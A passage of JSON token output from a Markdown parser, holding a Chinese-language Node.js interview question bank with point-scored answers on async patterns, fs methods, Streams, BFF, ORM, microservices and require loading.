分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的异步编程有以下几种方法：","text":"Node.js的异步编程有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的异步编程有以下几种方法：","text":"Node.js的异步编程有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n\\n- Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n\\n- async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n\\n- Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n\\n- 流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n\\n- 事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n\\n","task":false,"loose":true,"text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n","tokens":[{"type":"text","raw":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n","text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","tokens":[{"type":"text","raw":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n\\n","task":false,"loose":true,"text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n","tokens":[{"type":"text","raw":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n","text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","tokens":[{"type":"text","raw":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n\\n","task":false,"loose":true,"text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n","tokens":[{"type":"text","raw":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n","text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","tokens":[{"type":"text","raw":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n\\n","task":false,"loose":true,"text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n","tokens":[{"type":"text","raw":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n","text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","tokens":[{"type":"text","raw":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- 流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n\\n","task":false,"loose":true,"text":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n","tokens":[{"type":"text","raw":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n","text":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。","tokens":[{"type":"text","raw":"流程控制库：如","text":"流程控制库：如","escaped":false},{"type":"codespan","raw":"`async`","text":"async"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`bluebird`","text":"bluebird"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`co`","text":"co"},{"type":"text","raw":"等库，提供了更方便的异步编程方式。","text":"等库，提供了更方便的异步编程方式。","escaped":false}]}]},{"type":"list_item","raw":"- 事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","task":false,"loose":true,"text":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","tokens":[{"type":"text","raw":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","text":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","tokens":[{"type":"text","raw":"事件驱动：通过事件驱动的方式处理异步操作，如","text":"事件驱动：通过事件驱动的方式处理异步操作，如","escaped":false},{"type":"codespan","raw":"`EventEmitter`","text":"EventEmitter"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`Stream`","text":"Stream"},{"type":"text","raw":"等。","text":"等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. Nodejs的文件系统有哪些方法？\\n\\n","depth":2,"text":"8. Nodejs的文件系统有哪些方法？","tokens":[{"type":"text","raw":"8. Nodejs的文件系统有哪些方法？","text":"8. Nodejs的文件系统有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的文件系统有以下几种方法：","text":"Node.js的文件系统有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的文件系统有以下几种方法：","text":"Node.js的文件系统有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `fs.readFile`：读取文件内容。\\n\\n- `fs.writeFile`：写入文件内容。\\n\\n- `fs.appendFile`：追加文件内容。\\n\\n- `fs.unlink`：删除文件。\\n\\n- `fs.rename`：重命名文件。\\n\\n- `fs.stat`：获取文件信息。\\n\\n- `fs.readdir`：读取目录内容。\\n\\n- `fs.mkdir`：创建目录。\\n\\n- `fs.rmdir`：删除目录。\\n\\n- `fs.watch`：监听文件或目录的变化。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `fs.readFile`：读取文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.readFile`：读取文件内容。\\n","tokens":[{"type":"text","raw":"`fs.readFile`：读取文件内容。\\n","text":"`fs.readFile`：读取文件内容。","tokens":[{"type":"codespan","raw":"`fs.readFile`","text":"fs.readFile"},{"type":"text","raw":"：读取文件内容。","text":"：读取文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.writeFile`：写入文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.writeFile`：写入文件内容。\\n","tokens":[{"type":"text","raw":"`fs.writeFile`：写入文件内容。\\n","text":"`fs.writeFile`：写入文件内容。","tokens":[{"type":"codespan","raw":"`fs.writeFile`","text":"fs.writeFile"},{"type":"text","raw":"：写入文件内容。","text":"：写入文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.appendFile`：追加文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.appendFile`：追加文件内容。\\n","tokens":[{"type":"text","raw":"`fs.appendFile`：追加文件内容。\\n","text":"`fs.appendFile`：追加文件内容。","tokens":[{"type":"codespan","raw":"`fs.appendFile`","text":"fs.appendFile"},{"type":"text","raw":"：追加文件内容。","text":"：追加文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.unlink`：删除文件。\\n\\n","task":false,"loose":true,"text":"`fs.unlink`：删除文件。\\n","tokens":[{"type":"text","raw":"`fs.unlink`：删除文件。\\n","text":"`fs.unlink`：删除文件。","tokens":[{"type":"codespan","raw":"`fs.unlink`","text":"fs.unlink"},{"type":"text","raw":"：删除文件。","text":"：删除文件。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.rename`：重命名文件。\\n\\n","task":false,"loose":true,"text":"`fs.rename`：重命名文件。\\n","tokens":[{"type":"text","raw":"`fs.rename`：重命名文件。\\n","text":"`fs.rename`：重命名文件。","tokens":[{"type":"codespan","raw":"`fs.rename`","text":"fs.rename"},{"type":"text","raw":"：重命名文件。","text":"：重命名文件。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.stat`：获取文件信息。\\n\\n","task":false,"loose":true,"text":"`fs.stat`：获取文件信息。\\n","tokens":[{"type":"text","raw":"`fs.stat`：获取文件信息。\\n","text":"`fs.stat`：获取文件信息。","tokens":[{"type":"codespan","raw":"`fs.stat`","text":"fs.stat"},{"type":"text","raw":"：获取文件信息。","text":"：获取文件信息。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.readdir`：读取目录内容。\\n\\n","task":false,"loose":true,"text":"`fs.readdir`：读取目录内容。\\n","tokens":[{"type":"text","raw":"`fs.readdir`：读取目录内容。\\n","text":"`fs.readdir`：读取目录内容。","tokens":[{"type":"codespan","raw":"`fs.readdir`","text":"fs.readdir"},{"type":"text","raw":"：读取目录内容。","text":"：读取目录内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.mkdir`：创建目录。\\n\\n","task":false,"loose":true,"text":"`fs.mkdir`：创建目录。\\n","tokens":[{"type":"text","raw":"`fs.mkdir`：创建目录。\\n","text":"`fs.mkdir`：创建目录。","tokens":[{"type":"codespan","raw":"`fs.mkdir`","text":"fs.mkdir"},{"type":"text","raw":"：创建目录。","text":"：创建目录。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.rmdir`：删除目录。\\n\\n","task":false,"loose":true,"text":"`fs.rmdir`：删除目录。\\n","tokens":[{"type":"text","raw":"`fs.rmdir`：删除目录。\\n","text":"`fs.rmdir`：删除目录。","tokens":[{"type":"codespan","raw":"`fs.rmdir`","text":"fs.rmdir"},{"type":"text","raw":"：删除目录。","text":"：删除目录。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.watch`：监听文件或目录的变化。","task":false,"loose":true,"text":"`fs.watch`：监听文件或目录的变化。","tokens":[{"type":"text","raw":"`fs.watch`：监听文件或目录的变化。","text":"`fs.watch`：监听文件或目录的变化。","tokens":[{"type":"codespan","raw":"`fs.watch`","text":"fs.watch"},{"type":"text","raw":"：监听文件或目录的变化。","text":"：监听文件或目录的变化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 什么是Stream流，有哪些应用场景？\\n\\n","depth":2,"text":"9. 什么是Stream流，有哪些应用场景？","tokens":[{"type":"text","raw":"9. 什么是Stream流，有哪些应用场景？","text":"9. 什么是Stream流，有哪些应用场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n\\n- 比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n\\n","task":false,"loose":true,"text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n","tokens":[{"type":"text","raw":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n","text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","tokens":[{"type":"text","raw":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","escaped":false}]}]},{"type":"list_item","raw":"- 比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","task":false,"loose":true,"text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","tokens":[{"type":"text","raw":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","tokens":[{"type":"text","raw":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. 什么是BFF？\\n\\n","depth":2,"text":"10. 什么是BFF？","tokens":[{"type":"text","raw":"10. 什么是BFF？","text":"10. 什么是BFF？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n\\n- 最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n\\n","task":false,"loose":true,"text":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n","tokens":[{"type":"text","raw":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n","text":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。","tokens":[{"type":"text","raw":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。","text":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。","escaped":false}]}]},{"type":"list_item","raw":"- 最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","task":false,"loose":true,"text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","tokens":[{"type":"text","raw":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","tokens":[{"type":"text","raw":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. 什么是ORM？Nodejs的ORM框架有哪些？\\n\\n","depth":2,"text":"11. 什么是ORM？Nodejs的ORM框架有哪些？","tokens":[{"type":"text","raw":"11. 什么是ORM？Nodejs的ORM框架有哪些？","text":"11. 什么是ORM？Nodejs的ORM框架有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n\\n- 这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n\\n- Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n\\n","task":false,"loose":true,"text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n","tokens":[{"type":"text","raw":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n","text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","tokens":[{"type":"text","raw":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","escaped":false}]}]},{"type":"list_item","raw":"- 这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n\\n","task":false,"loose":true,"text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n","tokens":[{"type":"text","raw":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n","text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","tokens":[{"type":"text","raw":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","escaped":false}]}]},{"type":"list_item","raw":"- Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","task":false,"loose":true,"text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","tokens":[{"type":"text","raw":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","tokens":[{"type":"text","raw":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. 什么是微服务？\\n\\n","depth":2,"text":"12. 什么是微服务？","tokens":[{"type":"text","raw":"12. 什么是微服务？","text":"12. 什么是微服务？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n\\n- 微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n\\n","task":false,"loose":true,"text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n","tokens":[{"type":"text","raw":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n","text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","tokens":[{"type":"text","raw":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","escaped":false}]}]},{"type":"list_item","raw":"- 微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","task":false,"loose":true,"text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","tokens":[{"type":"text","raw":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","tokens":[{"type":"text","raw":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. 请介绍一下require的模块加载机制？\\n\\n","depth":2,"text":"13. 请介绍一下require的模块加载机制？","tokens":[{"type":"text","raw":"13. 请介绍一下require的模块加载机制？","text":"13. 请介绍一下require的模块加载机制？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 先计算模块路径\\n\\n- 如果模块在缓存里面，取出缓存\\n\\n- 如果是内置模块，取出内置模块\\n\\n- 加载模块\\n\\n- 输出模块的exports属性即可","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 先计算模块路径\\n\\n","task":false,"loose":true,"text":"先计算模块路径\\n","tokens":[{"type":"text","raw":"先计算模块路径\\n","text":"先计算模块路径","tokens":[{"type":"text","raw":"先计算模块路径","text":"先计算模块路径","escaped":false}]}]},{"type":"list_item","raw":"- 如果模块在缓存里面，取出缓存\\n\\n","task":false,"loose":true,"text":"如果模块在缓存里面，取出缓存\\n","tokens":[{"type":"text","raw":"如果模块在缓存里面，取出缓存\\n","text":"如果模块在缓存里面，取出缓存","tokens":[{"type":"text","raw":"如果模块在缓存里面，取出缓存","text":"如果模块在缓存里面，取出缓存","escaped":false}]}]},{"type":"list_item","raw":"- 如果是内置模块，取出内置模块\\n\\n","task":false,"loose":true,"text":"如果是内置模块，取出内置模块\\n","tokens":[{"type":"text","raw":"如果是内置模块，取出内置模块\\n","text":"如果是内置模块，取出内置模块","tokens":[{"type":"text","raw":"如果是内置模块，取出内置模块","text":"如果是内置模块，取出内置模块","escaped":false}]}]},{"type":"list_item","raw":"- 加载模块\\n\\n","task":false,"loose":true,"text":"加载模块\\n","tokens":[{"type":"text","raw":"加载模块\\n","text":"加载模块","tokens":[{"type":"text","raw":"加载模块","text":"加载模块","escaped":false}]}]},{"type":"list_item","raw":"- 输出模块的exports属性即可","task":false,"loose":true,"text":"输出模块的exports属性即可","tokens":[{"type":"text","raw":"输出模块的exports属性即可","text":"输出模块的exports属性即可","tokens":[{"type":"text","raw":"输出模块的exports属性即可","text":"输出模块的exports属性即可","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. Node.js的优点是什么？\\n\\n","depth":2,"text":"14. Node.js的优点是什么？","tokens":[{"type":"text","raw":"14. Node.js的优点是什么？","text":"14. Node.js的优点是什么？","escaped":false}]},{"type":"heading","raw":"#### 